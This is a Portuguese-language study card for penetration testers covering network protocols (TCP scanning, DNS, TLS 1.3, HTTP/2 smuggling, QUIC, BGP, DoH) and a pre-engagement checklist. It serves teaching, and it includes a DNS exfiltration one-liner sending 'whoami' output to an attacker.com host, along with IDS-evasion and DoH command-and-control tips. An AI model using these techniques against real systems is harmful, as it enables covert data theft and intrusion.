---
title: Redes & Protocolos para Pentester (2026)
category: auth
stack: [TCP/IP, DNS, TLS 1.3, HTTP/2, HTTP/3, QUIC, BGP]
tags: [redes, protocolos, pentest, fundamentos, tls, http3]
excerpt: O que um pentester realmente precisa saber sobre a stack que vai atacar — não a versão de certificação, a versão que aparece em engagement.
related: [sec-toolkit-pentest-2026, sec-web-fundamentos-headers, network-security-basics]
updated: "2026-05-10"
---

## Por que isso importa

Pentester que não sabe protocolo lê tráfego do Wireshark como se fosse hieróglifo. Você não consegue identificar HTTP smuggling sem entender CL/TE, não consegue explorar IMDSv1 sem entender que é um GET HTTP cru, não consegue triagear NTLM relay sem entender SMB. Esse card é o filtro: o que você usa todo dia em engagement.

## TCP/IP — o que importa em pentest

| Camada | Onde aparece em pentest |
|--------|------------------------|
| **L3 (IP)** | Spoofing em LAN, TTL fingerprinting (Linux=64, Windows=128), fragmentação evasion |
| **L4 (TCP/UDP)** | Connect scan vs SYN scan, SYN+ACK timing, UDP service enum |
| **L7 (App)** | 95% do trabalho — HTTP, DNS, SMB, SMTP, LDAP |

**TCP handshake** que aparece em scan:
```
SYN          → port aberta responde SYN+ACK
SYN+ACK ←
RST       → port fechada
(timeout)    → filtrada (firewall)
```

`nmap -sS` (SYN scan, half-open) é o default — nunca completa o handshake, então log de aplicação não captura. Mas IDS sim. Pra reduzir ruído use `-T2` (polite) e fragmentação `-f`.

## DNS — vetor subestimado

- **DNS exfiltration**: `dig @attacker.com $(whoami).c2.attacker.com` envia output via subdomain. Splunk pega isso só se tiver DNS log estruturado.
- **DNS rebinding**: domínio responde IP público no primeiro request, IP privado (192.168.x.x) no segundo. Bypass de SSRF protection que valida por hostname.
- **Subdomain takeover**: CNAME aponta pra recurso liberado (Heroku app deletado, S3 bucket vazio). Procurar com `subjack`, `nuclei takeovers/`.

## TLS 1.3 — diferenças críticas

TLS 1.3 não é "TLS 1.2 mais rápido". Em pentest:

- **Handshake encriptado depois do ClientHello/ServerHello** → não dá pra ver Server Name Indication no fio se ECH (Encrypted Client Hello) estiver ligado. Quebra muitos sniffing setups.
- **0-RTT (early data)**: vulnerável a replay attack se o servidor não rejeitar. Sempre testa em engagement.
- **Ciphers removidos**: RC4, 3DES, CBC mode, RSA key exchange (só DHE/ECDHE agora). Forward secrecy obrigatório.
- **Downgrade attack** ainda existe se o servidor aceitar TLS 1.0/1.1 — `nmap --script ssl-enum-ciphers -p 443 <host>` ou `sslyze`.

```bash
# Audit TLS de um endpoint
sslyze --regular target.com:443

# Confirma TLS 1.3 + ciphers ativos
nmap --script ssl-enum-ciphers -p 443 target.com
```

## HTTP/2 — onde mora HTTP Request Smuggling moderno

HTTP/2 multiplexa streams sobre uma conexão TCP. Quando o backend é HTTP/1.1 mas o frontend (load balancer / WAF) é HTTP/2, há tradução. **Aqui mora o smuggling:**

- **H2.CL / H2.TE**: frontend interpreta Content-Length ou Transfer-Encoding diferente do backend.
- **CRLF injection via pseudo-headers** (`:path`, `:authority`): smuggling de uma segunda request.
- **Request tunneling**: usar streams pra enviar payload que backend interpreta como nova request.

Ferramenta: **Caido** (rust, melhor que Burp pra HTTP/2) ou Burp Suite Pro com extensão HTTP Request Smuggler de James Kettle.

## HTTP/3 / QUIC — emergente em 2026

QUIC roda sobre UDP, integra TLS 1.3 no protocolo, tem connection migration nativo. Para pentest:

- Scanner de QUIC: `quic-scan`, `zgrab2 quic` — nmap ainda fraco em UDP/443.
- Bypass de IDS L7 que só inspeciona TCP/443 — muitos middleboxes ainda não fazem deep inspect de QUIC.
- Connection ID migration permite mover sessão entre IPs — interessante para evasion em red team se cliente usa.

Cloudflare, Google e Meta já servem 30%+ tráfego em HTTP/3. Brave, Chrome e Firefox negociam por default.

## BGP — só se for engagement de telco/ISP

90% dos pentests não tocam BGP. Mas em consultoria de ISP / hospital com BGP customer-edge:

- **BGP hijack** (anúncio de prefixo alheio) é problema de protocolo (não tem authn forte sem RPKI).
- **RPKI ROA** (Route Origin Authorization): valida que o AS anunciante tem direito ao prefixo. `bgpq4` para gerar.
- Audit: `mtr`, `traceroute --as-path`, `bgp.tools` para visualizar peering público.

## DNS over HTTPS / DoH em red team

- Em engagement red team, **DoH como C2 channel** (1.1.1.1, dns.google) é evasion clássica — tráfego sai como HTTPS comum.
- Defensive: bloquear DNS externo, forçar resolver corporativo, monitorar tráfego HTTPS para resolvers públicos.

## Checklist pré-engagement de rede

- [ ] Mapear escopo: CIDR, hosts in-scope, hosts out-of-scope, third-party (não atacar AWS metadata service em prod sem autorização).
- [ ] Identificar perímetro: edge devices, WAF, CDN (Cloudflare, Akamai, Fastly) — atacar origin direto se vazar IP.
- [ ] Listar protocolos em uso: nmap top-1000 TCP + top-100 UDP, masscan no resto pra cobertura.
- [ ] DNS recon: subdomain enum (amass, subfinder, ffuf), zone transfer test (`dig AXFR @ns target.com`).
- [ ] Certificate Transparency logs: `crt.sh` revela subdomínios não públicos.

## Armadilhas comuns

1. **Confiar em hostname pra SSRF protection** → DNS rebinding mata.
2. **Esquecer IPv6** → muitas regras de firewall protegem só IPv4. `nmap -6` revela superfície dobrada.
3. **Ignorar HTTP/2** → smuggling moderno só aparece em HTTP/2 frontend.
4. **Tratar TLS 1.3 como "seguro por padrão"** → 0-RTT replay e downgrade ainda existem.

## Leituras essenciais

- RFC 9110/9111/9112 (HTTP semântica, caching, HTTP/1.1)
- RFC 9113 (HTTP/2), RFC 9114 (HTTP/3), RFC 9000 (QUIC)
- "HTTP/2: A Practical Introduction" — Mozilla MDN
- "TLS 1.3 explained" — Cloudflare blog
- PortSwigger Web Security Academy: HTTP Request Smuggling track
